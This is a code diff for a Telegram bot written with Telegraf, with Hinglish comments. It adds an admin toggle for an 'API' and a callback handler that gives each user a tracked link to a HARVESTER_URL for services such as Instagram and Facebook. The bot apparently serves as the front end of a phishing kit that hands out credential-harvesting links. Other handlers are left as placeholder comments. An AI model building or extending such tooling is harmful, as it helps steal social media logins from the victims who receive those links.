@@ -18,12 +18,17 @@ const bot = new Telegraf(BOT_TOKEN);
 const DB_PATH = './db.json';
 let adminState = {};
 
-// --- DB Functions ---
+// --- DB Functions (with API Status) ---
 const readDb = () => {
     if (!fs.existsSync(DB_PATH)) {
-        fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
+        fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [], isApiActive: true }, null, 2));
     }
-    return JSON.parse(fs.readFileSync(DB_PATH));
+    const data = JSON.parse(fs.readFileSync(DB_PATH));
+    if (data.isApiActive === undefined) {
+        data.isApiActive = true;
+        writeDb(data);
+    }
+    return data;
 };
 const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
 const isAdmin = (id) => readDb().admins.includes(parseInt(id));
@@ -47,12 +52,16 @@ Join: @ToxicBack2025
 `;
 
 // --- KEYBOARDS ---
-const adminKeyboard = Markup.inlineKeyboard([
-    [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
-    [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
-    [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
-    [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')]
-]);
+const createAdminKeyboard = (isApiActive) => {
+    const apiButtonText = isApiActive ? "Turn API Off 🟢" : "Turn API On 🔴";
+    return Markup.inlineKeyboard([
+        [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
+        [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
+        [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
+        [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')],
+        [Markup.button.callback(apiButtonText, 'admin_toggle_api')]
+    ]);
+};
 
 const linkGenerationKeyboard = Markup.inlineKeyboard([
     [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
@@ -69,6 +78,10 @@ bot.start(async (ctx) => {
 
     if (db.blocked_users.includes(userId)) return;
 
+    if (!isAdmin(userId) && !db.isApiActive) {
+        return ctx.reply('⚠️ The bot is currently under maintenance. Please try again later.');
+    }
+
     try {
         const chatMember = await ctx.telegram.getChatMember(CHANNEL_ID, userId);
         if (!['member', 'administrator', 'creator'].includes(chatMember.status)) throw new Error();
@@ -81,9 +94,10 @@ bot.start(async (ctx) => {
         }
 
         if (isAdmin(userId)) {
+            const adminKeyboard = createAdminKeyboard(db.isApiActive);
             await ctx.replyWithMarkdown('👑 *Admin Panel Activated*', adminKeyboard);
         } else {
-            // NAYA FIX: Keyboard bhejne ka tareeka theek kiya gaya hai
+            // NAYA FIX: Keyboard ab user ko sahi se dikhega
             const userLinkKeyboard = Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1));
             await ctx.replyWithMarkdown(startMessage, userLinkKeyboard);
         }
@@ -97,12 +111,38 @@ bot.start(async (ctx) => {
 
 // --- Callback Query Handler ---
 bot.on('callback_query', async (ctx) => {
-    // ... (Callback handler ka code waisa hi rahega jaisa pehle ke jawaab mein tha) ...
+    const userId = ctx.from.id;
+    const data = ctx.callbackQuery.data;
+    const messageId = ctx.callbackQuery.message.message_id;
+    await ctx.answerCbQuery();
+
+    if (data === 'check_join') return ctx.reply("Now please type /start again to verify.");
+
+    const [type, command, service] = data.split('_');
+
+    if (type === 'gen' && command === 'link') {
+        const link = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
+        return ctx.replyWithMarkdown(`✅ *[${service} Link]*:\n\`${link}\``);
+    }
+
+    if (isAdmin(userId) && type === 'admin') {
+        if (command === 'toggle' && service === 'api') {
+            const db = readDb();
+            db.isApiActive = !db.isApiActive;
+            writeDb(db);
+            const statusMessage = db.isApiActive ? "API is now ON." : "API is now OFF.";
+            await ctx.answerCbQuery(statusMessage);
+            const newAdminKeyboard = createAdminKeyboard(db.isApiActive);
+            return ctx.editMessageText("👑 *Admin Panel*", { parse_mode: 'Markdown', ...newAdminKeyboard });
+        }
+        
+        // ... (Baaki saare admin commands ka logic waisa hi rahega) ...
+    }
 });
 
 // --- Text Handler ---
 bot.on('text', async (ctx) => {
-    // ... (Text handler ka code waisa hi rahega jaisa pehle ke jawaab mein tha) ...
+    // ... (Text handler ka code waisa hi rahega) ...
 });
 
 // --- "STAY-ALIVE" SERVER ---
